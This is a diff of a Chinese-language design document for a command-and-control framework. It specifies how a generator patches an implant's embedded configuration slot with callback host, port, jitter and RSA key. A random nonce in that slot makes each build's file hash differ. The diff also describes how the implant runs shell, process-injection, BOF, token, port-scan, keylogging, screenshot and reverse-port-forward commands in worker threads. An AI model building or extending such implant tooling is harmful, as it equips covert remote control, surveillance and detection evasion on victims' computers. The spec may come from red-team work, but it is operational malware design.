@@ -40,9 +40,12 @@ hmac_key  32 字节   随机
 ### 1.2 服务端密钥对
 
 - 首次启动生成 RSA-2048，落盘 `data/csdev.key`（PKCS#8 PEM）与 `data/csdev.pub`（PKIX PEM）。
-- 公钥需以 **CryptoAPI PUBLICKEYBLOB** 形式内嵌进植入体，生成命令：
+- **生成载荷时**，生成器从 `data/csdev.key` 现算 **CryptoAPI PUBLICKEYBLOB** 并覆写进载荷配置槽
+  （见 §1.3 `pubkey` 字段），保证载荷与服务端私钥**永远同源**——不再需要手动同步 `pubkey.h`。
+- `pubkey.h` 与 `--emit-pubkey` 退化为**手工 gcc 编译时的回退公钥**，仅供无生成器的本地联调用。
 
 ```
+# 手工 gcc 编译回退公钥（可选；生成器产出的载荷会自动带服务端当前公钥）
 csdev-server.exe --emit-pubkey C:\csdev-c2\kits\beacon\pubkey.h
 ```
 
@@ -55,6 +58,35 @@ modulus     256 字节，**小端**（Go 侧需对 big.Int 做字节序反转）
 ```
 
 C 侧直接 `CryptImportKey(hProv, blob, sizeof(blob), 0, 0, &hKey)`，无需解析。
+
+### 1.3 载荷配置槽（C2_RUNTIME_CFG，合计 1024 字节）
+
+植入体把运行期可变配置放在独立节 `.c2cfg` 里，生成器在二进制里扫描 8 字节高熵标记
+（`52 47 43 32 A5 5A C3 3C`，全文件**恰好命中一次**）后按偏移覆写。布局与
+`go/gen_native.go` 的常量表、`gui/NativeGenerator.cs` 逐字节对应：
+
+| 偏移 | 长度 | 字段 | 说明 |
+|---|---|---|---|
+| 0 | 8 | `magic` | 定位标记 |
+| 8 | 4 | `version` | `C2_CFG_VERSION = 2`；非 2 视为未启用 |
+| 12 | 4 | `port` | 回连端口 |
+| 16 | 4 | `sleep_ms` | 心跳间隔 |
+| 20 | 4 | `jitter` | 抖动百分比 |
+| 24 | 4 | `flags` | bit0 = TLS |
+| 28 | 4 | `nonce` | 每次生成随机，避免同配置产物哈希相同 |
+| 32 | 128 | `host` | 回连地址 |
+| 160 | 64 | `uri` | 上行路径 |
+| 224 | 32 | `xform` | body 变换链（`raw` / `base64` 等） |
+| 256 | 24 | `token_salt` | 启动口令盐（空 = 不启用门控） |
+| 280 | 72 | `token_hash` | SHA256(盐||口令) |
+| 352 | 48 | `id_header` | metadata 头名 |
+| 400 | 80 | `id_value` | metadata 头值 |
+| 480 | 276 | `pubkey` | CryptoAPI PUBLICKEYBLOB；**全 0 = 回退 §1.2 的 `pubkey.h`** |
+| 756 | 268 | `reserved` | 预留（生成时清零） |
+
+植入体侧 `c2cfg_pubkey()`：槽位 `version==2` 且 `pubkey` 非全 0 时用槽位公钥，否则回退编译期
+`CSDEV_PUBKEY_BLOB`。因此手工 gcc 编译的模板不带 pubkey 也能跑（用 `pubkey.h`），而生成器产出的
+载荷永远带服务端当前公钥。
 
 ---
 
@@ -219,6 +251,16 @@ count × [4B task_len][task 字节]
 status: 0=OK  1=ERR  2=PARTIAL（后续分块）  3=BUSY
 ```
 
+### 4.4 任务执行模型（异步）
+
+植入体把长阻塞命令（`EXEC_SHELL` / `INJ_PROC` / `INJ_BOF` / `INJ_ASSEMBLY` / `TOKEN` /
+`PORTSCAN`）放入**独立 worker 线程**执行，心跳主循环只做「睡眠 → 泵 → 收发 → 派发」，
+因此单条慢命令不会堵死通信；结果通过受临界区保护的 outbox 原子追加，随下一轮上行帧带回。
+
+涉及模块状态机的命令（`KEYLOG` / `SCREENSHOT` / `PROXY` / `FILE_DL` / `RPORTFWD`）仍在主循环
+同步执行（它们的 pump 跑在主循环上，跨线程会破坏状态）。服务端无需感知该调度差异——任务
+语义与 RESULT 回传完全不变。
+
 ---
 
 ## 5. 通道与 URI
@@ -343,13 +385,16 @@ rportfwd  -> 0x13 RPORTFWD
 
 ```
 1) 服务器首次启动         → 生成 data/csdev.key + data/csdev.pub
-2) --emit-pubkey <path>   → 输出 kits/beacon/pubkey.h（PUBLICKEYBLOB 数组 + 指纹）
-3) 生成器编译植入体        → -DC2_HOST -DC2_PORT -DC2_SSL 并 #include pubkey.h
-4) 植入体首次上线          → RSA 加密 (aes_key||hmac_key) 上报
+2) 生成器（服务端/客户端）→ 从 data/csdev.key 现算 PUBLICKEYBLOB，连同 host/port/… 一起
+                            覆写进载荷配置槽（§1.3），产出载荷
+3) 植入体启动             → c2cfg_pubkey() 读槽位公钥（无则回退 pubkey.h）
+4) 植入体首次上线         → RSA 加密 (aes_key||hmac_key) 上报
 5) 服务端解密并存会话密钥  → 此后全部帧走 AES + HMAC
 ```
 
-**公钥轮换**：重新生成密钥对后必须重编译植入体；已上线会话不受影响（密钥已协商）。
+**公钥轮换**：删除 `data/csdev.key` 让服务端首启重生成，或运行 `tools/gen_keypair.ps1 -Force`。
+轮换后**重新生成载荷**即可（生成器自动带上新公钥），已上线会话不受影响（密钥已协商）。
+手工 gcc 编译的植入体则需重新 `--emit-pubkey` 并重编译。
 
 ---
 
